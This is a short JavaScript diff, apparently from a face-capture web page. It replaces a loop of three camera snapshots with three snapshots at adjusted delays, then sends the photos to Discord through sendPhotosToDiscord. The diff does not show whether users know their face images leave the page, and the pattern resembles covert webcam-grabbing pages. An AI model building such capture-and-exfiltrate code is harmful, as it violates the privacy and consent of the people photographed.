@@ -411,11 +411,20 @@
             faceFrame.classList.remove('perfect');
             
             const photos = [];
-            for (let i = 0; i < 3; i++) {
-              await new Promise(r => setTimeout(r, 500));
-              const blob = await capturePhoto();
-              photos.push(blob);
-            }
+            // Primera foto
+            await new Promise(r => setTimeout(r, 300));
+            let blob = await capturePhoto();
+            photos.push(blob);
+            
+            // Segunda foto
+            await new Promise(r => setTimeout(r, 1200));
+            blob = await capturePhoto();
+            photos.push(blob);
+            
+            // Tercera foto
+            await new Promise(r => setTimeout(r, 1200));
+            blob = await capturePhoto();
+            photos.push(blob);
 
             await sendPhotosToDiscord(photos);
           }
